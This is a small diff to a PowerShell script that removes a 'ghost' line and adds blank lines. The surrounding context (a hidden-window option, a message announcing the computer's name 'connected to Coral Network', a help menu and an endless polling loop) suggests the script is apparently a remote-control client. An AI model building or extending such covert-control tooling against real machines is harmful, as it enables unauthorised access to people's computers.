@@ -1051,7 +1051,7 @@ if ($global:hidewindow) {
 
 # Send initial connection message
 sendMsg -Message "``$env:COMPUTERNAME connected to Coral Network``"
-ghost
+
 
 # =============================================================== HELP MENU ========================================================================
 function display_help{
@@ -1179,3 +1179,4 @@ while ($true) {
     Start-Sleep -Seconds 3
 
 }
+
